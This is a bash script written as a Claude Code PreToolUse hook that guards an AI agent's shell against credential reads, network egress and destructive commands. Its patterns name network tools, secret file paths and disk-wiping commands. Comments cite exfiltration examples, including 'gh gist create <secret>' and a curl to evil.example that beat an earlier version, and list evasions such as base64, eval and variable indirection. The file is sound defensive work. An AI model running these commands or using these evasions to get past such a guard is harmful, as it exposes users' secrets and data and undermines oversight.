#!/usr/bin/env bash
# bash-havoc-guard.sh - a Claude Code PreToolUse hook that guards an agent's shell.
#
# Three locks, in plain terms:
#   1. SECRETS      block a command that reads a credential file with a dumper like
#                   cat / grep / base64. Safe inspection (ls, wc, file, shasum, a
#                   counting grep) stays open.
#   2. EGRESS       block a network command (curl / wget / nc / ssh / scp / ...)
#                   unless it targets a local address. git / gh / npm stay open,
#                   except the gh subcommands that ship data or create or expose a
#                   remote.
#   3. DESTRUCTION  block recursive rm outside safe folders, raw-device dd, disk
#                   wipes (diskutil / mkfs), and git force-push.
#
# There is no agent override, on purpose. If a blocked command is legitimate, you
# run it yourself outside the agent. This is porous against deliberate obfuscation
# (base64, eval, variable indirection); the hard wall for that is an OS sandbox.
# This is the cheap layer that stops honest mistakes and the obvious attacks.
#
# It fails OPEN on a malformed payload or missing jq, so a broken guard can never
# brick a session.
#
# Install: point a Claude Code PreToolUse hook (matcher "Bash") at this script.
# Exit codes: 0 allow, 2 block (Claude Code shows the message to the model).
#
# Three lines below are marked `# EDIT`: your safe rm roots, extra credential
# paths, and your local network ranges. The defaults are sensible.

set -u

command -v jq >/dev/null 2>&1 || exit 0
PAYLOAD=$(cat 2>/dev/null) || exit 0
[ -n "$PAYLOAD" ] || exit 0
TOOL=$(jq -r '.tool_name // ""' <<<"$PAYLOAD" 2>/dev/null) || exit 0
[ "$TOOL" = "Bash" ] || exit 0
CMD=$(jq -r '.tool_input.command // ""' <<<"$PAYLOAD" 2>/dev/null)
[ -n "$CMD" ] || exit 0

deny() {
  {
    echo "BLOCKED by havoc guard [$1]: $2"
    echo "No agent override exists for this lock. If it's legitimate, run it yourself outside the agent."
  } >&2
  exit 2
}

# harmless null-redirects must not read as paths or writes
STRIPPED=$(sed -E 's/[0-9]*>{1,2}[[:space:]]*(\/dev\/null|&[0-9])//g' <<<"$CMD")

# ---- 1. SECRETS LOCK ------------------------------------------------------
# A credential path and a dumper have to appear in the SAME command segment, so the
# safe fingerprint idiom (shasum ~/.netrc | cut -c1-12) stays open. Known gap:
# variable indirection splits the pair across segments; that tier is an OS sandbox's
# job, not this one.
#
# The paths below cover the common stores plus the two an AI coding agent is most
# likely to reach: the Claude OAuth store (.credentials.json) and the GitHub token
# store (~/.config/gh). An early version of this hook missed both, so
# `cat ~/.config/gh/hosts.yml` and `gh gist create <secret>` sailed straight
# through. That is the whole reason this file exists.
#
# The token / secret / apikey rule is narrowed to path-shaped operands (a slash, a
# leading dot or tilde, or a real file extension) so a bare word like "tokens" in an
# argument does not false-trigger next to a word like "cp".
# EDIT: add any credential paths specific to your setup to this pattern.
CRED='(^|[[:space:]"'\''/=@])\.(ssh|aws|kube|netrc|pgpass)(/|\b)|\.config/(gcloud|rclone|gh|anthropic)\b|Library/Keychains|id_rsa|id_ed25519|\.credentials\.json|[^[:space:]"'\'']*/[A-Za-z0-9_.-]*(token|secret|apikey|api_key)[A-Za-z0-9_.-]*([[:space:]]|$|["'\''])|(^|[[:space:]"'\''=@])[.~][A-Za-z0-9_.~-]*(token|secret|apikey|api_key)[A-Za-z0-9_.-]*([[:space:]]|$|["'\''])|[A-Za-z0-9_-]*(token|secret|apikey|api_key)[A-Za-z0-9_-]*\.[A-Za-z0-9]+([[:space:]]|$|["'\''])|\.(pem|key|p12|pfx)([[:space:]]|$|["'\''])|(^|[[:space:]"'\''/=@])\.env(\.[A-Za-z0-9_.-]+)?($|[[:space:]"'\''])'
# gh is authenticated, so `gh gist create <secret>` is a one-command exfil primitive
# that no cred-path filter would see; it is handled in the EGRESS lock below.
DUMPERS='\b(cat|head|tail|less|more|strings|xxd|od|hexdump|base64|openssl|cut|awk|sed|sort|rev|tac|nl|paste|column|grep|egrep|fgrep|rg|ag|ack|cp|mv|ditto|tar|zip|gzip|bzip2|rsync|scp|dd|install|tee|source|gh|python[0-9.]*|ruby|perl|node|php)\b|(^|[;&|][[:space:]]*)\.[[:space:]]'
while IFS= read -r seg; do
  [ -n "$seg" ] || continue
  grep -Eq "$CRED" <<<"$seg" || continue
  # drop sanctioned count/quiet greps (grep/rg with a -c or -q flag) before dumper
  # matching; anchored on [[:space:]], not \b, because BSD sed has no \b
  segx=$(sed -E 's/(^|[[:space:]])(grep|egrep|fgrep|rg)[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*-[a-zA-Z]*[cq][a-zA-Z]*([[:space:]]|$)/ /g' <<<"$seg")
  if grep -Eq "$DUMPERS" <<<"$segx"; then
    deny "secrets" "content access to a credential path: ${seg:0:120}"
  fi
done < <(tr '|;&' '\n' <<<"$STRIPPED")

# ---- 2. EGRESS LOCK -------------------------------------------------------
# network binaries anchored to command position so a path like ~/.ssh (or the
# ssh-keygen binary) cannot false-match the ssh binary
NET='(^|[[:space:];&|(`])(curl|wget|nc|ncat|netcat|socat|scp|sftp|telnet|rsync|ssh|ftp)([[:space:]]|$)|\bopenssl[[:space:]]+s_client\b'
# EDIT: local destinations that are allowed. Default covers localhost, the loopback
# addresses, the Tailscale range (100.64/10), *.local, and *.ts.net.
LOCALOK='\blocalhost\b|127\.0\.0\.1|\b::1\b|0\.0\.0\.0|\b100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.[0-9]{1,3}\.[0-9]{1,3}\b|\.ts\.net\b|\.local\b'
# gh is authenticated: its publish / write subcommands ship data. Plain `gh api`
# GETs and `gh pr` / `gh --version` stay open; anything that sends data does not.
if grep -Eq '\bgh[[:space:]]+gist\b|\bgh[[:space:]]+release[[:space:]]+upload\b|\bgh[[:space:]]+api\b[^|]*(-X|--method)[[:space:]]*(POST|PUT|PATCH|DELETE)|\bgh[[:space:]]+api\b[^|]*(-f|--field|--input)\b' <<<"$CMD"; then
  deny "egress" "gh publish/write subcommand (can exfiltrate): ${CMD:0:120}"
fi
# git push stays open on the assumption of a known remote, but these create or flip
# a remote, so locally-committed secrets could ship to a sink that did not exist
# when this guard was written. `gh repo delete` is the same family's irreversible
# destruction primitive. All of these are human-only.
if grep -Eq '\bgh[[:space:]]+repo[[:space:]]+(create|fork|delete)\b|\bgh[[:space:]]+repo[[:space:]]+edit\b[^|;&]*--visibility' <<<"$CMD"; then
  deny "egress" "gh repo create/expose/delete (a new-remote exfil path): ${CMD:0:120}"
fi
# Anchor the local-destination test to the URL HOST, not the whole command. Matching
# the allow-list anywhere let `curl -A localhost https://evil.example/...` through: a
# user-agent string satisfied a check that was meant to describe where the data goes.
if grep -Eq "$NET" <<<"$CMD"; then
  bad=0
  HOSTS=$(grep -oE 'https?://[^[:space:]"'\''/]+' <<<"$CMD" | sed -E 's|https?://||; s|.*@||; s|:[0-9]+$||')
  if [ -n "$HOSTS" ]; then
    while IFS= read -r h; do
      [ -n "$h" ] || continue
      grep -Eq "^($LOCALOK)$|^([0-9]{1,3}\.){3}[0-9]{1,3}$" <<<"$h" || bad=1
      grep -Eq "$LOCALOK" <<<"$h" || bad=1
    done <<<"$HOSTS"
  else
    # no URL present (e.g. `nc host port`) - fall back to the whole-command test
    grep -Eq "$LOCALOK" <<<"$CMD" || bad=1
  fi
  [ "$bad" -eq 1 ] && deny "egress" "network command without a local-only destination: ${CMD:0:120}"
fi

# ---- 3. DESTRUCTION LOCK --------------------------------------------------
# EDIT: recursive rm is allowed only under these roots. Add your project folders.
SAFE_RM_ROOTS=("$HOME/projects" "/tmp" "/private/tmp" "/private/var/folders" "$HOME/.Trash")
if grep -Eq '\brm\b[^|;&]*[[:space:]]-[a-zA-Z-]*r' <<<"$STRIPPED"; then
  while IFS= read -r tok; do
    [ -z "$tok" ] && continue
    tok="${tok/#\$HOME/$HOME}"
    tok="${tok/#\~/$HOME}"
    safe=0
    for root in "${SAFE_RM_ROOTS[@]}"; do
      case "$tok" in "$root"/?*|"$root") safe=1; break ;; esac
    done
    [ "$safe" -eq 0 ] && deny "destruction" "recursive rm outside allowed roots (offending target: $tok)"
  done < <(grep -oE '(^|[[:space:]])(/|~|\$HOME)[^[:space:]]*' <<<"$STRIPPED" | sed -E 's/^[[:space:]]+//')
fi
if grep -Eq '\bdd\b[^|;&]*\bof=/dev/' <<<"$CMD"; then deny "destruction" "raw device write via dd"; fi
if grep -Eq '\bdiskutil\b[^|;&]*\b(erase[A-Za-z]*|reformat|partitionDisk|zeroDisk)\b' <<<"$CMD"; then deny "destruction" "diskutil erase-class command"; fi
if grep -Eq '\bmkfs' <<<"$CMD"; then deny "destruction" "mkfs"; fi
if grep -Eq '\bgit\b[^|;&]*\bpush\b[^|;&]*[[:space:]](-f|--force(-with-lease)?)\b' <<<"$CMD"; then deny "destruction" "git force-push"; fi

exit 0
